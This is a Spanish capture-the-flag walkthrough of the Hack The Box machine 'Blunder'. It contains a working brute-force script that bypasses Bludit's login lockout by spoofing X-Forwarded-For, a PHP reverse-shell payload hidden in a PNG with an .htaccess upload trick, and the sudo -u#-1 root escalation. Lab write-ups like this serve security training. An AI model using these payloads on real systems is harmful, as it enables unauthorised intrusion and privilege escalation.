---
title: Hack The Box Blunder
author: k4miyo
date: 2022-03-13
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [Bash, Account Misconfiguration]
ping: true
---

## Blunder
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.191.

```bash
❯ ping -c 1 10.10.10.191
PING 10.10.10.191 (10.10.10.191) 56(84) bytes of data.
64 bytes from 10.10.10.191: icmp_seq=1 ttl=63 time=138 ms

--- 10.10.10.191 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 137.673/137.673/137.673/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.191 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 21:51 CST
Initiating SYN Stealth Scan at 21:51
Scanning 10.10.10.191 [65535 ports]
Discovered open port 80/tcp on 10.10.10.191
Completed SYN Stealth Scan at 21:52, 26.42s elapsed (65535 total ports)
Nmap scan report for 10.10.10.191
Host is up, received user-set (0.14s latency).
Scanned at 2022-03-12 21:51:38 CST for 27s
Not shown: 65533 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.50 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 20 (876B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 114 B
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.191
   5   │     [*] Open ports: 80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p80 10.10.10.191 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 21:52 CST
Nmap scan report for 10.10.10.191
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Blunder
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds
```

Tenemos el puerto 80 abierto, así que antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos con la herramienta  `whatweb`:

```bash
❯ whatweb http://10.10.10.191
http://10.10.10.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.191], JQuery, MetaGenerator[Blunder], Script, Title[Blunder | A blunder of interesting facts], X-Powered-By[Bludit]
```

No vemos nada interesante, así que vamos a ver el contenido vía web.

![](/assets/images/htb-blunder/blunder-web.png)

En la web no vemos algo que nos llame la atención, así que vamos a tratar de descubrir rutas con `wfuzz`:

```bash
❯ wfuzz -c --hc=404 --hw=918 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.191/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000026:   200        105 L    303 W      3280 Ch     "about"                                                         
000000259:   301        0 L      0 W        0 Ch        "admin"                                                         
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 45.73100
Processed Requests: 1190
Filtered Requests: 1188
Requests/sec.: 26.02173
```

Vemos que tiene un recurso bajo `admin` el cual nos lleva a un panel de login de **BLUDIT**, que si buscamos un poco, tenemos que es un gestor de contenido el cual utiliza archivos en formato JSON para almacenar el contenido, no es necesario instalar ni configurar una base de datos. Para saber un poco más, podemos consultar el siguiente recurso [bludit](https://www.bludit.com/es/).

![](/assets/images/htb-blunder/blunder-web1.png)

Ahora vamos a tratar de buscar archivo alojados en el servidor de extensión txt, php, html, etc. Comenzaremos con txt.

```bash
❯ wfuzz -c --hc=404 --hw=918 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ.txt
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.191/FUZZ.txt
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000001765:   200        1 L      4 W        22 Ch       "robots"                                                        
000002495:   200        4 L      23 W       118 Ch      "todo"                                                          
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 3452
Filtered Requests: 3450
Requests/sec.: 0
```

Tenemos el recurso `todo.txt`, vamos a echarle un ojo.

![](/assets/images/htb-blunder/blunder-web2.png)

Tenemos un posible nombre de usuario: **fergus**; así que lo que podríamos hacer es tratar de aplicar fuerza bruta el panel de login utilizando como diccionario las palabras de la misma página web con la herramienta `cewl`.

```bash
❯ cewl -w diccionario.txt http://10.10.10.191/
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

Antes de empezar el ataque de fuerza bruta, vamos a verificar si el servidor cuenta con algún tipo de bloqueo.

![](/assets/images/htb-blunder/blunder-web3.png)

Vemos que el servidor bloquea las peticiones de nuestra dirección IP al intentar loguearnos múltiples veces en poco tiempo; por lo tanto vamos a investigar si encontramos algo para realizar bypass de la protección [rastating](https://rastating.github.io/bludit-brute-force-mitigation-bypass/). El articulo nos indica que la función **getUserIp** determina la dirección IP y confía en el valor de la cabecera **X-Forwarded-For**; por lo que podríamos tratar de modificar dicha cabecera de forma dinámica para burlar la protección.

```python
#!/usr/bin/python3
#coding:utf-8

import sys,signal,time,requests,re
from pwn import *

def def_handler(sig,frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

main_url = "http://10.10.10.191/admin/login.php"
dictionary = "diccionario.txt"

def makeRequest():
    try:
        s = requests.session()
        
        p1 = log.progress("Fuerza bruta Bludit")
        p1.status("Generando los datos a enviar")
        time.sleep(1)

        with open(dictionary) as fp:
            for password in fp.read().splitlines():
                r = s.get(main_url)
                token = re.findall(r'tokenCSRF" value=(".*?")',r.text)[0].replace('"','')

                headers_data = {
                    'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0',
                    'Referer' : 'http://10.10.10.191/admin/login.php',
                    'X-Forwarded-For' : password
                }

                post_data = {
                    'tokenCSRF' : token,
                    'username' : 'fergus',
                    'password' : password,
                    'save' : ''
                }

                r = s.post(main_url, headers=headers_data, data=post_data)
                p1.status("Probando credenciales: fergus - {}".format(password))

                if "Username or password incorrect" not in r.text:
                    p1.success("La contraseña del usuario fergus es: {}".format(password))
                    time.sleep(1)
                    sys.exit(0)

    except Exception as e:
        log(str(e))
        sys.exit(1)

if __name__=='__main__':
    makeRequest()
```

```bash
❯ python3 bruteforce_bypass_bludit.py
[+] Fuerza bruta Bludit: La contraseña del usuario fergus es: RolandDeschain
```

Ya tenemos la contraseña del usuario **fergus**, por lo que antes de que algo pase, vamos a guardarla para tenerla presente. Ahora vamos a ingresarlas en el panel de login.

![](/assets/images/htb-blunder/blunder-web4.png)

Buscando un poco en internet, vemos que existe el exploit [exploit-db](https://www.exploit-db.com/exploits/48701) el cual nos ayuda a subir un archivo para tener ejecución de comandos a nivel de sistema. Por lo tanto, lo traemos a nuestra máquina.

```bash
❯ searchsploit -m multiple/webapps/48701.txt
  Exploit: Bludit 3.9.2 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/48701
     Path: /usr/share/exploitdb/exploits/multiple/webapps/48701.txt
File Type: Python script, ASCII text executable

Copied to: /home/k4miyo/Documentos/HTB/Blunder/exploits/48701.txt


❯ mv 48701.txt bludit_rce.py
```

Lo leemos para ver que nos pide o que necesitamos para poderlo ejecutar. Cambiamos los valodres de url, username y password. Ahora creamos nuestro archivo png con contenido php que nos permita entablarnos la reverse shell.

```bash
❯ cat k4mishell.png
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: k4mishell.png
       │ Size: 98 B
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 443 >/tmp/f"); ?>
```

Creamos el payload2 de acuerdo con lo que nos indica el exploit:

```bash
❯ echo "RewriteEngine off" > .htaccess
❯ echo "AddType application/x-httpd-php .png" >> .htaccess
```

Ejecutamos el exploit:

```bash
❯ python3 bludit_rce.py
cookie: 9lqjvu73d8l94eu4vj44ml1uc4
csrf_token: 550b5a0bda69882d0de4407c6423bfe5d7d16cf0
Uploading payload: k4mishell.png
Uploading payload: .htaccess
```

Nos ponemos en escucha por el puerto 443 y ahora dice que debemos ingresar a la ruta `/bl-content/tmp/temp/` y deberíamos ver nuestro archivo. Por lo que al seleccionarlo deberíamos tener la conexión.

![](/assets/images/htb-blunder/blunder-web5.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.191] 43240
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ya nos encontramos dentro de la máquina y antes de hacer algo, vamos a realizar un [Tratamiento de la tty](/posts/tratamiento-tty). Vemos que no podemos visualizar la flag (user.txt) y tenemos que convertirnos en el usuario **hugo**; así que vamos a enumerar un poco el sistema.

```bash
www-data@blunder:/home$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@blunder:/home$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
www-data@blunder:/home$ cd /var/www/
www-data@blunder:/var/www$ grep -r -i "hugo" 2>/dev/null
bludit-3.10.0a/bl-content/databases/users.php:        "nickname": "Hugo",
bludit-3.10.0a/bl-content/databases/users.php:        "firstName": "Hugo",
www-data@blunder:/var/www$
```

Vemos dos archivos en donde se hace mención del usuario **hugo**, así que vamos a echarles un ojo:

```bash
www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
www-data@blunder:/var/www$
```

Vemos la contraseña de dicho usuario hasheada, por lo tanto vamos a rompearla con [crackstation](https://crackstation.net/).

![](/assets/images/htb-blunder/blunder-web6.png)

No olvidemos guardar las credenciales y trataremos de migrar a dicho usuario:

```bash
www-data@blunder:/var/www$ su hugo
Password: 
hugo@blunder:/var/www$ whoami
hugo
hugo@blunder:/var/www$
```

Ya somos el usuario **hugo** y podemos visualizar la flag (user.txt). Ahora debemos encontrar una forma en la que podamos escalar privilegios.

```bash
hugo@blunder:~$ id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
hugo@blunder:~$ sudo -l
Password: 
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:~$
```

Vemos que podemos ejecutar `/bin/bash` como cualquier usuario del sistema a excepción de **root**. Si investigamos un poco, vemos que nos encontramos ante sudo de version 1.8.27:

```bash
hugo@blunder:~$ apt list 2>/dev/null | grep "^sudo"
sudo-ldap/eoan-updates,eoan-security 1.8.27-1ubuntu4.1 amd64
sudo-ldap/eoan-updates,eoan-security 1.8.27-1ubuntu4.1 i386
sudo/eoan-updates,eoan-security,now 1.8.27-1ubuntu4.1 amd64 [installed]
sudo/eoan-updates,eoan-security 1.8.27-1ubuntu4.1 i386
sudoku/eoan 1.0.5-2build3 amd64
sudoku/eoan 1.0.5-2build3 i386
hugo@blunder:~$
```

Y de dicha versión, existe un exploit público que nos puede ayudar a escalar privilegios:

```bash
❯ searchsploit sudo 1.8.27
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
sudo 1.8.27 - Security Bypass                                                                  | linux/local/47502.py
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Dicho exploit nos dice que podemos ejecutar el comando `sudo -u#-1 /bin/bash` y que se nos otorga una shell como **root**. Asi que vamos a probarlo (la contraseña que nos solicita es del usuario **hugo**).

```bash
hugo@blunder:~$ sudo -u#-1 /bin/bash
Password: 
root@blunder:/home/hugo# whoami
root
root@blunder:/home/hugo#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
